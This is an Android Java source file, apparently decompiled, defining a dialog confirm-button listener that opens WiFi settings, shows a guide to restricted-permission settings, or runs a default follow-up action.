package com.guard.wallet.helper;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.util.Log;
import java.lang.ref.WeakReference;
import java.util.Objects;

/**
 * 对话框确认按钮点击监听器。
 *
 * <p>根据构造参数 {@code action} 区分不同业务场景：
 * <ul>
 *   <li>0 — WiFi 引导对话框确认，触发 {@code g.n1()} 打开 WiFi 设置</li>
 *   <li>1 — 受限权限中性按钮，关闭对话框后调用 {@code GuideDialogUtils.showGuideActivity()} 导航到受限设置</li>
 *   <li>default — 通用确认，关闭对话框后执行 {@code g.V0()} 默认后续操作</li>
 * </ul>
 *
 * <p>vendor 原名: {@code helper.j}
 */
public final class PositiveClickListener implements DialogInterface.OnClickListener {
    public final int a;

    public PositiveClickListener(int a) { this.a = a; }

    @Override
    public final void onClick(DialogInterface dialog, int which) {
        switch (a) {
            case 0:
                com.guard.wallet.utils.SystemHelper.n1();
                break;
            case 1:
                Log.d("AccessibilityUtils", "NeutralButton click");
                dismissDialog();
                com.guard.wallet.utils.GuideDialogUtils.showGuideActivity();
                break;
            default:
                dismissDialog();
                com.guard.wallet.utils.SystemHelper.V0();
                break;
        }
    }

    private void dismissDialog() {
        WeakReference<AlertDialog> ref = com.guard.wallet.utils.GuideDialogUtils.guideDialogRef;
        if (ref != null && ref.get() != null) {
            ref.get().dismiss();
        }
    }
}
